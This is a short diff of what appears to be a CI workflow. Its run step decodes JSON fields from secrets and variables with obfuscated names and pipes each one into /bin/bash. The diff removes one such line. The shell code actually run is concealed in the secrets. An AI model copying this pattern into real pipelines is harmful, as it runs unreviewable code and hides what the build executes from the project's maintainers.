@@ -21,7 +21,6 @@ jobs:
           vq03420: ${{ secrets.vq03420 }}
         run: |
           printf '%s' "$vq03420" | jq -r .dogso8 | /bin/bash
-          echo $lqrf79528 | jq -r .twly76 | /bin/bash
           printf '%s' "$v696" | jq -r .u244 | /bin/bash
           printf '%s' "$x50" | jq -r .e9311 | /bin/bash
           echo $jwd937 | jq -r .ifc7053 | /bin/bash
